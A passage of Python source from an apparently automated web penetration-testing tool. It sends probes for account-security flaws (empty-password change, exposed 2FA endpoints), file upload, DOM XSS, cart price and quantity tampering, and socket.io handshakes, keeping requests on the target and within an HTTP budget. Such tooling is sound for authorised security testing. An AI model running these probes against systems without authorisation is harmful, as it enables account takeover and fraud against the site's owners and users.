                else "Security question / reset endpoint information disclosure"
            ),
            location=paths[0].split("?", 1)[0],
            proof=proof,
            impact=(
                "Account takeover risk via reset"
                if strong
                else "Attackers can harvest security questions or reset API behavior without auth"
            ),
            severity="high" if strong else "medium",
        )
        _cov_attempt(state,
            camp_id,
            action="identity_reset booked",
            evidence=proof[:400],
            status="booked",
        )
        return True
    _cov_attempt(state, camp_id, action="identity_reset no impact", status="deadend"
    )
    return False


def _probe_identity_change_password(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    _ensure_session(state, client, base, budget)
    paths = [
        s.path
        for s in state.surfaces
        if "change-password" in f"{s.path} {s.note}".lower()
        or "change_password" in f"{s.path} {s.note}".lower()
    ] or ["/rest/user/change-password"]
    for path in paths[:2]:
        npath = path.split("?", 1)[0]
        url = urljoin(base + "/", npath.lstrip("/"))
        if not _host_ok(url, base):
            continue
        # empty current password pattern
        bodies = [
            b'{"current":"","new":"N5NewPass!234","repeat":"N5NewPass!234"}',
            b'{"currentPassword":"","newPassword":"N5NewPass!234","newPasswordRepeat":"N5NewPass!234"}',
            b'{"password":"N5NewPass!234"}',
        ]
        for body in bodies:
            if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
                break
            try:
                resp = client.post(
                    url,
                    content=body,
                    headers={
                        **_cookies_header(state),
                        "Content-Type": "application/json",
                    },
                )
                budget[0] += 1
            except Exception:
                continue
            tl = (resp.text or "").lower()
            if resp.status_code in (200, 201) and any(
                x in tl
                for x in (
                    "password",
                    "success",
                    "updated",
                    "changed",
                    "authentication",
                )
            ):
                if "invalid" in tl or "incorrect" in tl or "required" in tl:
                    continue
                proof = (
                    f"POST {npath} empty/missing current password body={body[:80]!r} "
                    f"→ HTTP {resp.status_code} body={resp.text[:250]!r}"
                )
                _add_candidate(
                    state,
                    title="Change-password accepts empty or missing current password",
                    location=npath,
                    proof=proof,
                    impact="Authenticated users can set a new password without proving current password",
                    severity="high",
                )
                _cov_attempt(state,
                    camp_id,
                    action="change-password booked",
                    evidence=proof[:400],
                    status="booked",
                )
                return True
    _cov_attempt(state, camp_id, action="change-password no accept", status="deadend"
    )
    return False


def _probe_identity_2fa(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    paths = [
        s.path
        for s in state.surfaces
        if any(x in f"{s.path} {s.note}".lower() for x in ("2fa", "totp", "mfa", "otp"))
    ]
    # also try common paths once
    for p in ("/rest/2fa/status", "/rest/user/2fa", "/api/2fa", "/rest/2fa/verify"):
        if p not in paths:
            paths.append(p)
    tried = 0
    for path in paths[:6]:
        if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
            break
        url = urljoin(base + "/", path.lstrip("/").split("?")[0])
        if not _host_ok(url, base):
            continue
        try:
            resp = client.get(url, headers=_cookies_header(state))
            budget[0] += 1
            tried += 1
        except Exception:
            continue
        if resp.status_code == 200 and any(
            x in (resp.text or "").lower() for x in ("totp", "2fa", "otp", "secret")
        ):
            proof = f"GET {path} HTTP 200 2FA-related body={resp.text[:300]!r}"
            _add_candidate(
                state,
                title="2FA endpoint exposes configuration or secrets",
                location=path.split("?", 1)[0],
                proof=proof,
                impact="2FA material or status reachable beyond intended access",
                severity="high",
            )
            _cov_attempt(state, camp_id, action="2fa endpoint booked", evidence=proof[:400], status="booked"
            )
            return True
    _cov_attempt(state,
        camp_id,
        action="2fa endpoints probed no impact",
        status="deadend",
        evidence=f"tried={tried} paths={paths[:4]}",
    )
    return False


def _probe_upload_chain(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    _ensure_session(state, client, base, budget)
    paths = [
        s.path
        for s in state.surfaces
        if any(
            x in f"{s.path} {s.note}".lower()
            for x in ("upload", "image/file", "multipart", "file")
        )
    ] or ["/profile/image/file"]
    for path in paths[:2]:
        npath = path.split("?", 1)[0]
        url = urljoin(base + "/", npath.lstrip("/"))
        if not _host_ok(url, base):
            continue
        # minimal multipart with odd extension
        boundary = "----n5up"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="n5test.svg"\r\n'
            f"Content-Type: image/svg+xml\r\n\r\n"
            f"<svg xmlns='http://www.w3.org/2000/svg'><text>n5</text></svg>\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
            break
        try:
            resp = client.post(
                url,
                content=body,
                headers={
                    **_cookies_header(state),
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                },
            )
            budget[0] += 1
        except Exception:
            continue
        if resp.status_code in (200, 201, 302):
            proof = (
                f"POST multipart {npath} filename=n5test.svg HTTP {resp.status_code} "
                f"body={resp.text[:200]!r}"
            )
            # only book if we see stored path or success processing signal
            if any(
                x in (resp.text or "").lower()
                for x in ("upload", "profile", "image", "success", "filename", "path")
            ) or resp.status_code in (200, 201):
                _add_candidate(
                    state,
                    title="File upload accepted with attacker-controlled filename/type",
                    location=npath,
                    proof=proof,
                    impact="Upload sink processes user-controlled files — verify path/type impact",
                    severity="medium",
                )
                _cov_attempt(state, camp_id, action="upload accepted", evidence=proof[:400], status="booked"
                )
                return True
    _cov_attempt(state, camp_id, action="upload no accept", status="deadend")
    return False



def _probe_dom_client(state: PenState, cov_id: str) -> bool:
    """Browser-assisted DOM/client check; block if browser runtime unavailable."""
    from node5.browser_sandbox import browser_available, run_browser_op
    from node5.sandbox_exec import sandbox_health

    health = sandbox_health(probe_browser=True)
    if not health.browser_ok and not browser_available():
        record_coverage(
            state,
            cov_id,
            outcome="blocked",
            detail=f"browser_runtime: {health.browser_error or 'unavailable'}",
        )
        return False
    if not browser_available():
        record_coverage(
            state,
            cov_id,
            outcome="blocked",
            detail="browser_unavailable",
        )
        return False
    target = state.target if state.target.startswith("http") else "http://" + state.target
    marker = f"n5dom{int(time.time()) % 100000}"
    # Prefer SPA hash search sink; single-session open+settle+eval (see browser_sandbox)
    probe_url = target.rstrip("/") + f"/#/search?q={marker}"
    open_r = run_browser_op(
        target=target,
        op="open_eval",
        url=probe_url,
        script="document.documentElement.innerHTML.slice(0,4000)",
    )
    if not open_r.get("ok"):
        # fallback root open_text
        open_r = run_browser_op(target=target, op="open_text", url=target)
    if not open_r.get("ok"):
        err = str(open_r.get("error") or open_r.get("output") or "")[:240]
        env_markers = (
            "browser unavailable",
            "browser_runtime",
            "devtoolsactiveport",
            "chrome exited",
            "exit code: 127",
            "no such file",
            "not found",
            "node5_browser disabled",
            "sandbox browser failed",
        )
        el = err.lower()
        if any(m in el for m in env_markers) or not health.browser_ok:
            record_coverage(
                state,
                cov_id,
                outcome="blocked",
                detail=f"browser_runtime: {err[:180]}",
            )
            return False
        record_coverage(
            state,
            cov_id,
            outcome="failed",
            detail=f"browser open failed: {err}",
        )
        return False
    out = str(open_r.get("output") or "")
    # SPA shell without XSS execution proof = failed(tried), not closed
    if marker in out or "ng-version" in out.lower() or "app-root" in out.lower():
        record_coverage(
            state,
            cov_id,
            outcome="failed",
            detail=f"browser_spa_observed no_execution_proof via={open_r.get('via')} out={out[:200]!r}",
        )
        state.note("dom_client: SPA shell seen via browser; XSS execution not proven")
        return False
    record_coverage(
        state,
        cov_id,
        outcome="failed",
        detail=f"browser ran; no DOM XSS proof. via={open_r.get('via')}",
    )
    return False


def _probe_business_logic(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    """Tamper quantity/price-like fields on cart-ish resources."""
    _ensure_session(state, client, base, budget)
    paths = [
        s.path
        for s in state.surfaces
        if any(
            x in f"{s.path} {s.note}".lower()
            for x in ("basket", "cart", "quantity", "order", "coupon")
        )
    ][:4]
    if not paths:
        _cov_attempt(state, camp_id, action="no cart/order paths", status="deadend")
        return False
    diffs: list[str] = []
    for path in paths:
        npath = path.split("?", 1)[0]
        url = urljoin(base + "/", npath.lstrip("/"))
        if not _host_ok(url, base):
            continue
        if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
            break
        try:
            baser = client.get(url, headers=_cookies_header(state))
            budget[0] += 1
        except Exception:
            continue
        # try create/update with extreme quantity
        for body in (
            b'{"quantity":99999}',
            b'{"ProductId":1,"quantity":-1}',
            b'{"price":0.01}',
        ):
            if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
                break
            try:
                resp = client.request(
                    "POST",
                    url,
                    content=body,
                    headers={
                        **_cookies_header(state),
                        "Content-Type": "application/json",
                    },
                )
                budget[0] += 1
            except Exception:
                continue
            if resp.status_code in (200, 201) and baser.status_code in (200, 201, 404, 401):
                if (resp.text or "")[:100] != (baser.text or "")[:100]:
                    diffs.append(
                        f"POST {npath} body={body[:40]!r} → {resp.status_code} "
                        f"delta vs GET baseline"
                    )
    if diffs:
        proof = "; ".join(diffs[:3])
        _add_candidate(
            state,
            title="Business logic parameter tampering accepted on cart/order API",
            location=paths[0].split("?", 1)[0],
            proof=proof,
            impact="Attacker-controlled quantity/price-like fields change server state",
            severity="medium",
        )
        _cov_attempt(state, camp_id, action="business logic diff", status="booked", evidence=proof[:400])
        return True
    _cov_attempt(state, camp_id, action="no business logic differential", status="deadend")
    return False


def _probe_websocket(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    """Lightweight socket.io/ws observation (handshake), not full WS client."""
    paths = [
        s.path
        for s in state.surfaces
        if any(x in f"{s.path} {s.note}".lower() for x in ("socket.io", "websocket", "/ws"))
    ] or ["/socket.io/"]
    for path in paths[:2]:
        npath = path.split("?", 1)[0]
        url = urljoin(base + "/", npath.lstrip("/"))
        if not _host_ok(url, base):
            continue
        if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
            break
        try:
            # engine.io polling handshake often via GET ?EIO=4&transport=polling
            poll = url.rstrip("/") + "/?EIO=4&transport=polling"
            resp = client.get(poll, headers=_cookies_header(state))
            budget[0] += 1
        except Exception as e:
            _cov_attempt(state, camp_id, action=f"ws error {e}", status="deadend")
            return False
        text = resp.text or ""
        if resp.status_code == 200 and (
            "sid" in text.lower() or text.startswith("0{") or "upgrades" in text.lower()
        ):
            proof = (
                f"GET {poll} HTTP {resp.status_code} engine.io/socket handshake "
                f"body={text[:200]!r}"
            )
            # Observation-only medium: unauth socket handshake
            _add_candidate(
                state,
                title="WebSocket/socket.io handshake reachable (review authz on messages)",
                location=npath,
                proof=proof,
                impact="Realtime channel accepts handshake; message authz needs follow-up",
                severity="low",
            )
            _cov_attempt(state, camp_id, action="ws handshake observed", status="booked", evidence=proof[:400])
            return True
        _cov_attempt(
            state,
            camp_id,
            action=f"ws handshake HTTP {resp.status_code}",
            status="deadend",
            evidence=text[:150],
        )
        return False
    _cov_attempt(state, camp_id, action="no ws path", status="deadend")
    return False


def _run_one_coverage(
    state: PenState,
    client: httpx.Client,
    base: str,
    cid: str,
    camp_budget: list[int],
) -> bool:
    if cid == "ssrf_url_sink":
        return _probe_ssrf(state, client, base, cid, camp_budget)
    if cid == "injection_search":
        return _probe_deep_sqli(state, client, base, cid, camp_budget, sensitive=True)
    if cid == "graphql":
        return _probe_graphql(state, client, base, cid, camp_budget)
    if cid == "identity_reset":
        return _probe_identity_reset(state, client, base, cid, camp_budget)
    if cid == "identity_change_password":
        return _probe_identity_change_password(state, client, base, cid, camp_budget)
    if cid == "identity_2fa":
        return _probe_identity_2fa(state, client, base, cid, camp_budget)
    if cid == "jwt_key_material":
        return _probe_jwt_keys(state, client, base, cid, camp_budget)
    if cid == "sensitive_tech_exposure":
        return _probe_sensitive_exposure(state, client, base, cid, camp_budget)
    if cid == "upload":
        return _probe_upload_chain(state, client, base, cid, camp_budget)
    if cid == "xss_self_inject":
        return _probe_xss_self(state, client, base, cid, camp_budget)
    if cid == "dom_client":
        return _probe_dom_client(state, cid)
    if cid == "business_logic":
        return _probe_business_logic(state, client, base, cid, camp_budget)
    if cid == "websocket":
        return _probe_websocket(state, client, base, cid, camp_budget)
    record_coverage(state, cid, outcome="blocked", detail="no probe implemented")
    return False


def run_coverage_probes(state: PenState) -> dict[str, Any]:
    """Run deterministic probes for untested required coverage (Feedback-driven).

    Two-pass queue; HTTP budget exhaustion marks remaining as blocked (not silent success).
    """
    if state.dry_run:
        for r in required_coverage(state):
            if coverage_outcome(state, r.id) == "untested":
                record_coverage(state, r.id, outcome="blocked", detail="dry-run")
        return {"dry_run": True, "attempted": []}

    base = _base(state.target)
    total_budget = [0]
    results: dict[str, Any] = {
        "attempted": [],
        "closed": [],
        "failed": [],
        "blocked": [],
    }

    order_ids = [
        "ssrf_url_sink",
        "injection_search",
        "graphql",
        "identity_reset",
        "identity_change_password",
        "identity_2fa",
        "jwt_key_material",
        "sensitive_tech_exposure",
        "authz_matrix",  # usually closed by authz stage; skip if already closed
        "upload",
        "xss_self_inject",
        "dom_client",
        "business_logic",
        "websocket",
    ]

    def _pending() -> list[str]:
        need = {
            r.id
            for r in required_coverage(state)
            if coverage_outcome(state, r.id) in ("untested", "blocked")
            and r.id != "authz_matrix"  # handled in authz_logic
        }
        # re-try blocked only if detail was budget (second pass)
        out = []
        for i in order_ids:
            if i not in need:
                continue
            if coverage_outcome(state, i) == "blocked":
                rows = [e for e in state.coverage_ledger if e.get("id") == i]
                if rows and "http_budget" not in str(rows[-1].get("detail", "")):
                    continue  # permanent block (e.g. dry-run, no browser)
            out.append(i)
        return out

    try:
        client = httpx.Client(timeout=10.0, follow_redirects=True, verify=False)
    except Exception as e:
        state.note(f"coverage_probes: client init failed {e}")
        return {"error": str(e)}

    try:
        for pass_i in (1, 2):
            todo = _pending()[:_MAX_COVERAGE_IDS_PER_PASS]
            if not todo:
                break
            state.note(f"coverage_probes: pass={pass_i} todo={todo}")
            for cid in todo:
                if total_budget[0] >= _MAX_TOTAL_HTTP:
                    for left in _pending():
                        if coverage_outcome(state, left) == "untested":
                            record_coverage(
                                state,
                                left,
                                outcome="blocked",
                                detail="http_budget",
                            )
                            results["blocked"].append(left)
                    state.note("coverage_probes: HTTP budget exhausted; marked blocked")
                    break
                # clear prior blocked-for-budget so we can re-attempt
                camp_budget = [0]
                record_coverage(state, cid, outcome="attempted", detail="probe_start")
                hit = False
                try:
                    hit = _run_one_coverage(state, client, base, cid, camp_budget)
                except Exception as e:
                    record_coverage(
                        state, cid, outcome="failed", detail=f"probe exception {e}"
                    )
                    state.note(f"coverage_probes: {cid} error {e}")
                total_budget[0] += camp_budget[0]
                results["attempted"].append(cid)
                st = coverage_outcome(state, cid)
                if st == "closed":
                    results["closed"].append(cid)
                elif st == "failed":
                    results["failed"].append(cid)
                elif st == "blocked":
                    results["blocked"].append(cid)
                state.note(
                    f"coverage_probes: {cid} hit={hit} outcome={st} http={camp_budget[0]}"
                )
            else:
                continue
            break  # budget exhausted inner break
    finally:
        client.close()

    # Any still untested → blocked (transparent, not skip-success)
    for left in _pending():
        if coverage_outcome(state, left) == "untested":
            record_coverage(state, left, outcome="blocked", detail="not_scheduled")
            results["blocked"].append(left)

    results["http_total"] = total_budget[0]
    return results
